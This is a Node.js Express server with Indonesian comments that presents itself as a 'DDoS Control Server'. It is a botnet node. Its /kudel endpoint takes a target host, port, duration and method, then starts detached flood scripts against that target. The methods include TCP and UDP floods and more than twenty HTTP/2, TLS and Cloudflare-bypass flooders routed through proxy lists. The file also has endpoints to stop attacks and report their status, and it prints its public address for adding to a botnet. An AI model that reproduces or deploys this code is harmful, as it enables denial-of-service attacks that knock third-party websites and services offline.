const express = require('express');
const { exec, spawn, execFile } = require('child_process');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const os = require('os');
const net = require('net');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// Menyimpan proses serangan yang sedang berjalan
const activeAttacks = new Map();
const attackStatistics = new Map();

// Binary execution subsystem yang sederhana
class AttackExecutor {
    constructor() {
        this.pythonTCPPath = './lib/cache/tcp.py';
        this.pythonUDPPath = './lib/cache/udp.py';
        this.checkPythonScripts();
    }

    checkPythonScripts() {
        console.log('Checking Python attack scripts...');
        
        // Cek tcp.py
        if (fs.existsSync(this.pythonTCPPath)) {
            console.log(`✓ TCP Python script found at: ${path.resolve(this.pythonTCPPath)}`);
        } else {
            console.error(`✗ TCP Python script not found at: ${path.resolve(this.pythonTCPPath)}`);
            console.log('⚠ Please ensure tcp.py is in lib/cache directory');
        }
        
        // Cek udp.py
        if (fs.existsSync(this.pythonUDPPath)) {
            console.log(`✓ UDP Python script found at: ${path.resolve(this.pythonUDPPath)}`);
        } else {
            console.error(`✗ UDP Python script not found at: ${path.resolve(this.pythonUDPPath)}`);
            console.log('⚠ Please ensure udp.py is in lib/cache directory');
        }
        
        // Cek Python availability
        this.checkPythonAvailability();
    }
    
    checkPythonAvailability() {
        // Cek apakah Python terinstall
        exec('python --version || python3 --version', (error, stdout, stderr) => {
            if (error) {
                console.error('✗ Python not found or not in PATH');
                console.log('⚠ Please install Python 3.x to use TCP/UDP attacks');
            } else {
                console.log(`✓ Python available: ${stdout || stderr}`);
            }
        });
    }
    
    getPythonCommand() {
        // Coba python3 dulu, lalu python
        return new Promise((resolve) => {
            exec('which python3 || which python', (error, stdout) => {
                if (error) {
                    console.warn('⚠ Using default python command');
                    resolve('python');
                } else {
                    const pythonPath = stdout.trim();
                    console.log(`✓ Using Python at: ${pythonPath}`);
                    resolve(pythonPath);
                }
            });
        });
    }

    async executeTCPAttack(host, port, attackTime, attackKey, targetInfo) {
        if (!fs.existsSync(this.pythonTCPPath)) {
            console.error(`✗ Cannot execute TCP attack: tcp.py not found`);
            return null;
        }

        try {
            // Parameter untuk tcp.py: python tcp.py ip port packet time threads
            // packet bisa di-set default 1024 atau disesuaikan
            const threads = 1; // Default threads
            const packets = 1024; // Default packets per second
            
            // Format: python tcp.py ip port packet time threads
            const pythonCmd = await this.getPythonCommand();
            const args = [this.pythonTCPPath, host, port.toString(), attackTime.toString(), packets.toString(), threads.toString()];
            
            console.log(`🚀 Executing TCP attack: ${pythonCmd} ${args.join(' ')}`);
            
            const childProcess = spawn(pythonCmd, args, {
                detached: true,
                stdio: ['ignore', 'pipe', 'pipe']
            });

            // Track process output for debugging
            childProcess.stdout.on('data', (data) => {
                console.log(`[TCP stdout]: ${data.toString().trim()}`);
            });
            
            childProcess.stderr.on('data', (data) => {
                console.error(`[TCP stderr]: ${data.toString().trim()}`);
            });

            childProcess.on('error', (error) => {
                console.error(`✗ Error executing TCP attack:`, error.message);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                this.updateAttackStatus(attackKey, 'failed', error.message);
            });

            childProcess.on('exit', (code, signal) => {
                console.log(`[TCP] Process exited with code ${code}, signal ${signal}`);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                const status = code === 0 ? 'completed' : 'failed';
                this.updateAttackStatus(attackKey, status, `Exit code: ${code}`);
            });

            childProcess.on('close', (code) => {
                console.log(`[TCP] Process closed with code ${code}`);
            });

            // Store process information
            activeAttacks.set(attackKey, {
                process: childProcess,
                type: 'tcp',
                script: this.pythonTCPPath,
                command: `${pythonCmd} ${args.join(' ')}`,
                startTime: Date.now(),
                target: targetInfo
            });

            this.updateAttackStatus(attackKey, 'running', 'TCP attack started');
            childProcess.unref();
            
            return childProcess;
        } catch (error) {
            console.error(`✗ Failed to spawn TCP attack:`, error.message);
            this.updateAttackStatus(attackKey, 'failed', error.message);
            return null;
        }
    }

    async executeUDPAttack(host, port, attackTime, attackKey, targetInfo) {
        if (!fs.existsSync(this.pythonUDPPath)) {
            console.error(`✗ Cannot execute UDP attack: udp.py not found`);
            return null;
        }

        try {
            // Parameter untuk udp.py: python udp.py ip port duration
            // Bisa ditambah parameter tambahan sesuai kebutuhan
            
            const pythonCmd = await this.getPythonCommand();
            const args = [this.pythonUDPPath, host, port.toString(), attackTime.toString()];
            
            // Jika butuh parameter tambahan seperti threads/packets, bisa ditambahkan
            // args.push(threads.toString(), packets.toString());
            
            console.log(`🚀 Executing UDP attack: ${pythonCmd} ${args.join(' ')}`);
            
            const childProcess = spawn(pythonCmd, args, {
                detached: true,
                stdio: ['ignore', 'pipe', 'pipe']
            });

            // Track process output for debugging
            childProcess.stdout.on('data', (data) => {
                console.log(`[UDP stdout]: ${data.toString().trim()}`);
            });
            
            childProcess.stderr.on('data', (data) => {
                console.error(`[UDP stderr]: ${data.toString().trim()}`);
            });

            childProcess.on('error', (error) => {
                console.error(`✗ Error executing UDP attack:`, error.message);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                this.updateAttackStatus(attackKey, 'failed', error.message);
            });

            childProcess.on('exit', (code, signal) => {
                console.log(`[UDP] Process exited with code ${code}, signal ${signal}`);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                const status = code === 0 ? 'completed' : 'failed';
                this.updateAttackStatus(attackKey, status, `Exit code: ${code}`);
            });

            // Store process information
            activeAttacks.set(attackKey, {
                process: childProcess,
                type: 'udp',
                script: this.pythonUDPPath,
                command: `${pythonCmd} ${args.join(' ')}`,
                startTime: Date.now(),
                target: targetInfo
            });

            this.updateAttackStatus(attackKey, 'running', 'UDP attack started');
            childProcess.unref();
            
            return childProcess;
        } catch (error) {
            console.error(`✗ Failed to spawn UDP attack:`, error.message);
            this.updateAttackStatus(attackKey, 'failed', error.message);
            return null;
        }
    }

    updateAttackStatus(attackKey, status, message = '') {
        if (attackStatistics.has(attackKey)) {
            const stats = attackStatistics.get(attackKey);
            stats.status = status;
            stats.endTime = status !== 'running' ? Date.now() : undefined;
            stats.message = message;
            if (stats.endTime && stats.startTime) {
                stats.actualDuration = stats.endTime - stats.startTime;
            }
        }
    }
}

// Initialize attack executor
const attackExecutor = new AttackExecutor();

// Attack statistics tracker class
class AttackStatistics {
    static trackAttack(attackKey, method, target, port, plannedDuration) {
        const stats = {
            startTime: Date.now(),
            method: method,
            target: target,
            port: port,
            plannedDuration: parseInt(plannedDuration) * 1000, // Convert to ms
            status: 'running',
            actualDuration: null,
            endTime: null,
            message: ''
        };
        attackStatistics.set(attackKey, stats);
        return stats;
    }

    static completeAttack(attackKey, status = 'completed', message = '') {
        if (attackStatistics.has(attackKey)) {
            const stats = attackStatistics.get(attackKey);
            stats.status = status;
            stats.endTime = Date.now();
            stats.actualDuration = stats.endTime - stats.startTime;
            stats.message = message;
        }
    }

    static getStats() {
        return Array.from(attackStatistics.entries());
    }

    static getActiveAttacks() {
        return Array.from(attackStatistics.entries())
            .filter(([key, stats]) => stats.status === 'running');
    }
}

// Fungsi untuk mengambil data dari API
async function fetchData() {
    try {
        const response = await axios.get('https://httpbin.org/get', {
            timeout: 10000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        const data = response.data;
        const serverUrl = `http://${data.origin}:${port}`;
        console.log(`🌐 Copy This Add To Botnet -> ${serverUrl}`);
        console.log(`🔗 API Endpoint: ${serverUrl}/kudel`);
        console.log(`⏹️ Stop Endpoint: ${serverUrl}/stop`);
        return data;
    } catch (error) {
        console.error('❌ Error fetching data:', error.message);
        // Fallback to local IP detection
        try {
            const interfaces = os.networkInterfaces();
            let localIp = 'localhost';
            Object.keys(interfaces).forEach(iface => {
                interfaces[iface].forEach(addr => {
                    if (addr.family === 'IPv4' && !addr.internal) {
                        localIp = addr.address;
                    }
                });
            });
            const serverUrl = `http://${localIp}:${port}`;
            console.log(`🌐 Local Server URL -> ${serverUrl}`);
            console.log(`🔗 API Endpoint: ${serverUrl}/kudel`);
            console.log(`⏹️ Stop Endpoint: ${serverUrl}/stop`);
            return { origin: localIp };
        } catch (fallbackError) {
            console.error('❌ Fallback IP detection failed:', fallbackError.message);
            return { origin: 'localhost' };
        }
    }
}

// Middleware untuk logging
app.use((req, res, next) => {
    console.log(`📨 ${new Date().toISOString()} ${req.method} ${req.url} from ${req.ip}`);
    next();
});

// Endpoint untuk menerima request serangan
app.get('/kudel', (req, res) => {
    const { host, port: targetPort, time, methods } = req.query;

    // Validasi parameter
    if (!host || !targetPort || !time || !methods) {
        return res.status(400).json({
            success: false,
            error: 'Missing required parameters: host, port, time, methods',
            example: '/kudel?host=example.com&port=80&time=60&methods=tcp'
        });
    }

    // Validasi waktu serangan (max 3600 detik = 1 jam)
    const attackTime = Math.min(parseInt(time), 3600);
    if (attackTime < 1) {
        return res.status(400).json({
            success: false,
            error: 'Attack time must be at least 1 second'
        });
    }

    // Validasi port
    const portNum = parseInt(targetPort);
    if (portNum < 1 || portNum > 65535) {
        return res.status(400).json({
            success: false,
            error: 'Invalid port number. Must be between 1 and 65535'
        });
    }

    // Respon ke client
    res.status(200).json({
        success: true,
        message: 'API request received. Executing attack shortly.',
        target: host,
        port: portNum,
        time: attackTime,
        methods: methods,
        attack_id: `${host}:${portNum}-${methods}-${Date.now()}`
    });

    console.log(`🎯 Received attack request: Method ${methods}, Target ${host}:${portNum}, Duration ${attackTime}s`);

    // Daftar metode serangan
    const attackMethods = {
        'h2-reset': `node ./lib/cache/h2-reset.js GET ${host} ${attackTime} 1 90 proxy.txt --cdn true --full --legit --randrate true`,
        'h2-zero': `node ./lib/cache/h2-zero.js ${host} ${attackTime} 90 1 proxy.txt`,
        'h2-bypass': `node ./lib/cache/h2-bypass.js ${host} ${attackTime} 90 1 proxy.txt`,
        'h2-cf': `node ./lib/cache/h2-cf.js ${host} ${attackTime} 1 90 proxy.txt`,
        'h2-cfb': `node ./lib/cache/h2-cfb.js GET "${host}" ${attackTime} 1 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --authorization Bearer:abc123 --randrate --full --fakebot true --auth`,
        'h2-skid': `node ./lib/cache/https-skid.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-tlsv3': `node ./lib/cache/https-tlsv3.js ${host} ${attackTime} 90 1 proxy.txt`,
        'glory': `node ./lib/cache/https-tlsv2.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-uam': `node ./lib/cache/https-uam.js ${host} ${attackTime} 90 proxy.txt`,
        'tcp': 'tcp',
        'udp': 'udp',
        'http': `node ./lib/cache/http.js ${host} ${attackTime} 90 1 proxy.txt flood`,
        'tls-flood': `node ./lib/cache/tls.js ${host} ${attackTime} 90 1 proxy.txt`,
        'browser': `node ./lib/cache/browser.js ${host} ${attackTime}`,

        'h2-rip': `node ./lib/cache/h2-rip.js ${host} ${attackTime} 90 1 proxy.txt --all--bypass --all--full --all--extra --all-redirect --all-fingerprint --all-npath`,
        'hold': `node ./lib/cache/hold.js ${host} ${attackTime} 1 proxy.txt 90 true`,
        'https-cve': `node ./lib/cache/https-cve.js GET "${host}" ${attackTime} 1 90 proxy.txt -query 1 --debug --limit true`,
        'https': `node ./lib/cache/https.js ${host} ${attackTime} 1 90 proxy.txt`,

        'rip-mix': `node ./lib/cache/rip-mix.js ${host} ${attackTime} 90 1`,
        'rip-zpush': `node ./lib/cache/rip-zpush.js ${host} ${attackTime} 90 1 proxy.txt`,

        'rip-priv': `node ./lib/cache/rip-priv.js ${host} ${attackTime} 90 1 proxy.txt`,
        'rip-flood': `node ./lib/cache/rip-flood.js ${host} ${attackTime} 90 1 proxy.txt`,
        'rip-random': `node ./lib/cache/rip-random.js ${host} ${attackTime} 1 90`
    };

    // Fungsi untuk mengeksekusi perintah
    const executeAttack = async (methodConfig, attackKey, methodName) => {
        const targetInfo = { host, port: portNum, time: attackTime };
        
        if (typeof methodConfig === 'string') {
            // Cek jika ini metode TCP/UDP Python
            if (methodConfig === 'tcp') {
                return await attackExecutor.executeTCPAttack(host, portNum, attackTime, attackKey, targetInfo);
            } else if (methodConfig === 'udp') {
                return await attackExecutor.executeUDPAttack(host, portNum, attackTime, attackKey, targetInfo);
            } else {
                // Node.js script execution
                console.log(`🟢 Executing Node.js script: ${methodConfig}`);
                const [command, ...args] = methodConfig.split(' ');
                const childProcess = spawn(command, args, {
                    detached: true,
                    stdio: 'ignore'
                });
                
                activeAttacks.set(attackKey, {
                    process: childProcess,
                    type: 'nodejs',
                    script: methodConfig,
                    startTime: Date.now(),
                    target: targetInfo
                });
                
                AttackStatistics.trackAttack(attackKey, methodName, host, portNum, attackTime);
                
                childProcess.on('error', (error) => {
                    console.error(`❌ Error executing Node.js script:`, error.message);
                    activeAttacks.delete(attackKey);
                    AttackStatistics.completeAttack(attackKey, 'failed', error.message);
                });
                
                childProcess.on('exit', (code) => {
                    console.log(`📊 Node.js script exited with code ${code}`);
                    activeAttacks.delete(attackKey);
                    AttackStatistics.completeAttack(attackKey, code === 0 ? 'completed' : 'failed', `Exit code: ${code}`);
                });
                
                childProcess.unref();
                return childProcess;
            }
        }
    };

    // Generate unique attack key
    const baseAttackKey = `${host}:${portNum}-${methods}-${Date.now()}`;

    // Cek jika methods adalah mix (format: method1+method2+method3)
    if (methods.includes('+')) {
        const methodList = methods.split('+');
        // Batasi maksimal 5 metode
        const selectedMethods = methodList.slice(0, 5)
            .map(method => ({ name: method, config: attackMethods[method] }))
            .filter(item => item.config !== undefined);
        
        if (selectedMethods.length > 0) {
            console.log(`🔀 Executing mix of ${selectedMethods.length} methods: ${selectedMethods.map(m => m.name).join(', ')}`);
            
            selectedMethods.forEach(async (method, index) => {
                const attackKey = `${baseAttackKey}-${index}`;
                AttackStatistics.trackAttack(attackKey, method.name, host, portNum, attackTime);
                await executeAttack(method.config, attackKey, method.name);
            });
        } else {
            console.log('❌ No valid methods found in mix');
        }
    } else {
        // Eksekusi metode tunggal
        const selectedMethod = attackMethods[methods];
        if (selectedMethod) {
            AttackStatistics.trackAttack(baseAttackKey, methods, host, portNum, attackTime);
            executeAttack(selectedMethod, baseAttackKey, methods);
        } else {
            console.log(`❌ Unsupported method: ${methods}`);
            console.log(`📋 Supported methods: ${Object.keys(attackMethods).join(', ')}`);
        }
    }

    // Auto-cleanup setelah serangan selesai
    setTimeout(() => {
        if (activeAttacks.has(baseAttackKey)) {
            console.log(`🕒 Auto-cleaning attack ${baseAttackKey} after completion`);
            activeAttacks.delete(baseAttackKey);
        }
    }, attackTime * 1000 + 10000); // Waktu serangan + 10 detik buffer
});

// Endpoint untuk menghentikan serangan
app.get('/stop', (req, res) => {
    const { target, port, attack_id } = req.query;
    let stoppedCount = 0;
    let stoppedDetails = [];

    if (attack_id) {
        // Hentikan serangan spesifik berdasarkan ID
        if (activeAttacks.has(attack_id)) {
            try {
                const attack = activeAttacks.get(attack_id);
                attack.process.kill('SIGTERM');
                activeAttacks.delete(attack_id);
                AttackStatistics.completeAttack(attack_id, 'stopped', 'Manually stopped by API');
                stoppedCount++;
                stoppedDetails.push(attack_id);
                console.log(`⏹️ Stopped specific attack: ${attack_id}`);
            } catch (error) {
                console.error(`❌ Error stopping attack ${attack_id}:`, error.message);
            }
        }
        res.status(200).json({
            success: true,
            message: `Stopped ${stoppedCount} attacks for ID ${attack_id}`,
            stopped_attacks: stoppedDetails
        });
    } else if (target && port) {
        // Hentikan serangan spesifik berdasarkan target dan port
        for (const [key, attack] of activeAttacks.entries()) {
            if (key.includes(`${target}:${port}`)) {
                try {
                    attack.process.kill('SIGTERM');
                    activeAttacks.delete(key);
                    AttackStatistics.completeAttack(key, 'stopped', 'Manually stopped by API');
                    stoppedCount++;
                    stoppedDetails.push(key);
                    console.log(`⏹️ Stopped attack: ${key}`);
                } catch (error) {
                    console.error(`❌ Error stopping attack ${key}:`, error.message);
                }
            }
        }
        res.status(200).json({
            success: true,
            message: `Stopped ${stoppedCount} attacks for ${target}:${port}`,
            stopped_attacks: stoppedDetails
        });
    } else {
        // Hentikan semua serangan
        for (const [key, attack] of activeAttacks.entries()) {
            try {
                attack.process.kill('SIGTERM');
                activeAttacks.delete(key);
                AttackStatistics.completeAttack(key, 'stopped', 'Manually stopped by API');
                stoppedCount++;
                stoppedDetails.push(key);
                console.log(`⏹️ Stopped attack: ${key}`);
            } catch (error) {
                console.error(`❌ Error stopping attack ${key}:`, error.message);
            }
        }
        res.status(200).json({
            success: true,
            message: `Stopped all ${stoppedCount} attacks`,
            stopped_attacks: stoppedDetails
        });
    }
});

// Endpoint untuk status server
app.get('/status', (req, res) => {
    const activeCount = activeAttacks.size;
    const totalStats = AttackStatistics.getStats().length;
    const activeStats = AttackStatistics.getActiveAttacks();
    
    res.status(200).json({
        server_status: 'running',
        port: port,
        uptime: process.uptime(),
        active_attacks: activeCount,
        total_attacks_processed: totalStats,
        currently_active: activeStats.map(([key, stats]) => ({
            attack_id: key,
            method: stats.method,
            target: `${stats.target}:${stats.port}`,
            duration: `${Math.round((Date.now() - stats.startTime) / 1000)}s/${Math.round(stats.plannedDuration / 1000)}s`,
            status: stats.status
        })),
        memory_usage: process.memoryUsage()
    });
});

// Endpoint untuk info scripts
app.get('/scripts', (req, res) => {
    const scriptsInfo = {
        tcp_py: {
            exists: fs.existsSync(attackExecutor.pythonTCPPath),
            path: path.resolve(attackExecutor.pythonTCPPath)
        },
        udp_py: {
            exists: fs.existsSync(attackExecutor.pythonUDPPath),
            path: path.resolve(attackExecutor.pythonUDPPath)
        }
    };
    
    res.json({
        platform: process.platform,
        architecture: process.arch,
        python_scripts: scriptsInfo,
        supported_attacks: {
            python_based: ['tcp', 'udp'],
            nodejs_based: [
                'h2-reset', 'h2-zero', 'h2-bypass', 'h2-cf', 'h2-cfb', 
                'h2-skid', 'https-tlsv3', 'glory', 'https-uam', 'http', 
                'tls-flood', 'browser', 'h2-rip', 'hold', 'https-cve', 
                'https', 'rip-mix', 'rip-zpush', 'rip-priv', 'rip-flood', 
                'rip-random'
            ]
        }
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        server: 'DDoS Control Server',
        version: '1.0.0'
    });
});

// Handle 404
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'Endpoint not found',
        available_endpoints: {
            attack: 'GET /kudel?host=target.com&port=80&time=60&methods=tcp',
            stop: 'GET /stop?target=host&port=80 OR /stop?attack_id=id',
            status: 'GET /status',
            scripts: 'GET /scripts',
            health: 'GET /health'
        }
    });
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('💥 Server error:', error);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: error.message
    });
});

// Graceful shutdown handling
process.on('SIGINT', () => {
    console.log('\n🛑 Received SIGINT. Shutting down gracefully...');
    
    // Stop all active attacks
    let stoppedCount = 0;
    for (const [key, attack] of activeAttacks.entries()) {
        try {
            attack.process.kill('SIGTERM');
            stoppedCount++;
        } catch (error) {
            console.error(`Error stopping attack ${key}:`, error.message);
        }
    }
    
    console.log(`⏹️ Stopped ${stoppedCount} active attacks`);
    console.log('👋 Server shutdown complete');
    process.exit(0);
});

// Jalankan server
app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
    console.log(`📍 Local URL: http://localhost:${port}`);
    console.log(`📊 Status endpoint: http://localhost:${port}/status`);
    console.log(`🛑 Stop endpoint: http://localhost:${port}/stop`);
    console.log('🔧 Checking Python attack scripts...');
    
    // Initial system check
    setTimeout(() => {
        fetchData();
        console.log('✅ Server initialization complete');
        console.log('💡 Use /kudel endpoint to start attacks');
        console.log('💡 Use /scripts endpoint to check script status');
    }, 1000);
});

// Export untuk testing
module.exports = { app, attackExecutor, activeAttacks, attackStatistics };